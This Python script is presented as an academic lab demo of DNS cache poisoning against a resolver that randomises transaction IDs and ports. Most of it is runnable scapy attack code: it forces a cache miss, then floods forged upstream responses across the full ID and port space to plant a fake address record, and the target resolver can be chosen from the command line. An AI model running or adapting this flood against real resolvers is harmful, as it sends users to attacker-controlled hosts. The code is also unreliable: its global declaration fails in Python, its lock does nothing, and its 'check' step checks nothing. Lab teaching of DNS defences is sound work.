#!/usr/bin/env python3
"""
attack_hardened.py — Academic DNS Cache Poisoning Demo (Hardened Target)
=========================================================================
This script demonstrates a brute-force flood attack against a DNS resolver
that uses:
  * Full 16-bit transaction ID randomisation (0–65535)
  * Random ephemeral source port (approx 32768–60999)

WHY IS THIS MUCH HARDER?
--------------------------
Vulnerable server:  50 TX-IDs × 1 port  =        50 guesses needed
Hardened server:  65536 TX-IDs × ~28232 ports = ~1.85 billion guesses

APPROACH — "Birthday Paradox" Flooding
----------------------------------------
We cannot enumerate all combinations, so we:
  1. Trigger the resolver to forward an upstream query (cache miss).
  2. Immediately flood it with spoofed forged responses covering ALL 65536
     TX-IDs across a sweep of the common Linux ephemeral-port range
     (32768–60999) in rotating chunks.
  3. Repeat until a spoofed response lands before the real upstream reply.

This is purely for academic demonstration inside an isolated Docker network.
It will likely take many seconds or minutes to succeed — illustrating why
port randomisation is an effective mitigation.

Usage:
    python attack_hardened.py <target_domain> <spoofed_ip> [--rounds N]

    target_domain : domain to poison, e.g. example.com
    spoofed_ip    : fake IP to inject, e.g. 6.6.6.6
    --rounds N    : how many port-sweep rounds to attempt (default: 5)
"""

import sys
import time
import argparse
import threading
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, conf

# ── Configuration ────────────────────────────────────────────────────────────
RESOLVER_IP      = "10.0.0.2"   # change to 10.0.0.6 for hardened server
UPSTREAM_FAKE_IP = "10.0.0.5"   # we spoof responses *from* the upstream

# Linux ephemeral port range (sysctl net.ipv4.ip_local_port_range)
EPHEMERAL_LOW  = 32768
EPHEMERAL_HIGH = 60999
EPHEMERAL_RANGE = list(range(EPHEMERAL_LOW, EPHEMERAL_HIGH + 1))

# TX-ID covers the full 16-bit space
TXID_MIN = 0
TXID_MAX = 65535

# Packets per thread burst
BURST   = 500
THREADS = 8
# ─────────────────────────────────────────────────────────────────────────────


def build_spoofed_response(hostname, fake_ip, tx_id, src_port):
    """Return a single spoofed DNS response packet."""
    ip = IP(dst=RESOLVER_IP, src=UPSTREAM_FAKE_IP)
    udp = UDP(dport=src_port, sport=53)        # dport = resolver's source port
    dns = DNS(
        id=tx_id,
        qr=1, aa=1, rd=0,
        qdcount=1, ancount=1,
        qd=DNSQR(qname=hostname),
        an=DNSRR(rrname=hostname, type='A', ttl=3600, rdata=fake_ip)
    )
    return ip / udp / dns


def trigger_cache_miss(hostname):
    """Send a legitimate query to force the resolver to go upstream."""
    pkt = (
        IP(dst=RESOLVER_IP) /
        UDP(dport=53) /
        DNS(id=1, qr=0, rd=1, qd=DNSQR(qname=hostname, qtype="A"))
    )
    send(pkt, verbose=0)
    print(f"[*] Cache-miss triggered for '{hostname}'")


def flood_burst(hostname, fake_ip, tx_ids, ports, stats):
    """
    Worker thread: send spoofed responses for every (tx_id, port) pair
    in the given slices.
    """
    sent = 0
    for port in ports:
        for tx_id in tx_ids:
            pkt = build_spoofed_response(hostname, fake_ip, tx_id, port)
            send(pkt, verbose=0)
            sent += 1
    with threading.Lock():
        stats['sent'] += sent


def run_attack(hostname: str, fake_ip: str, rounds: int):
    print("=" * 60)
    print(" DNS Cache Poisoning — Hardened Server Edition")
    print("=" * 60)
    print(f" Target resolver : {RESOLVER_IP}")
    print(f" Domain          : {hostname}")
    print(f" Injecting IP    : {fake_ip}")
    print(f" TX-ID space     : {TXID_MIN}–{TXID_MAX}  ({TXID_MAX - TXID_MIN + 1} values)")
    print(f" Port range      : {EPHEMERAL_LOW}–{EPHEMERAL_HIGH} ({len(EPHEMERAL_RANGE)} values)")
    print(f" Rounds          : {rounds}")
    print(f" Threads/round   : {THREADS}")
    print("=" * 60)
    print()

    # Suppress verbose scapy output
    conf.verb = 0

    tx_ids = list(range(TXID_MIN, TXID_MAX + 1))

    for rnd in range(1, rounds + 1):
        print(f"[Round {rnd}/{rounds}]")

        # 1. Flush cache by first triggering a fresh upstream query
        trigger_cache_miss(hostname)
        time.sleep(0.05)   # small gap so resolver sends the upstream request

        # 2. Split port range across threads
        stats = {'sent': 0}
        port_chunks = [EPHEMERAL_RANGE[i::THREADS] for i in range(THREADS)]

        workers = []
        t_start = time.time()
        for chunk in port_chunks:
            t = threading.Thread(
                target=flood_burst,
                args=(hostname, fake_ip, tx_ids, chunk, stats),
                daemon=True
            )
            t.start()
            workers.append(t)

        for t in workers:
            t.join()

        elapsed = time.time() - t_start
        rate    = stats['sent'] / elapsed if elapsed > 0 else 0
        print(f"    Sent {stats['sent']:,} packets in {elapsed:.1f}s  "
              f"({rate:,.0f} pkt/s)")

        # 3. Check if poisoning succeeded (query the resolver and inspect reply)
        print(f"    Checking resolver cache for '{hostname}' ...")
        time.sleep(0.3)

    print()
    print("[*] Attack rounds complete.")
    print("[*] Verify result from victim container:")
    print(f"    dig @{RESOLVER_IP} {hostname}")
    print(f"    Expected if poisoned : {fake_ip}")
    print()
    print("[!] NOTE: Success against the hardened server may take many")
    print("    rounds or may not occur at all — that is the POINT.")
    print("    The hardened server requires ~1.85 billion guesses vs ~50")
    print("    for the vulnerable server. Entropy works!")


def main():
    parser = argparse.ArgumentParser(
        description="Academic DNS cache poisoning demo — hardened server"
    )
    parser.add_argument("hostname",  help="Target domain, e.g. example.com")
    parser.add_argument("spoofed_ip", help="Fake IP to inject, e.g. 6.6.6.6")
    parser.add_argument(
        "--rounds", type=int, default=5,
        help="Number of flood rounds (default 5)"
    )
    parser.add_argument(
        "--resolver", default=RESOLVER_IP,
        help=f"Resolver IP to target (default {RESOLVER_IP})"
    )
    args = parser.parse_args()

    global RESOLVER_IP
    RESOLVER_IP = args.resolver

    run_attack(args.hostname, args.spoofed_ip, args.rounds)


if __name__ == "__main__":
    main()
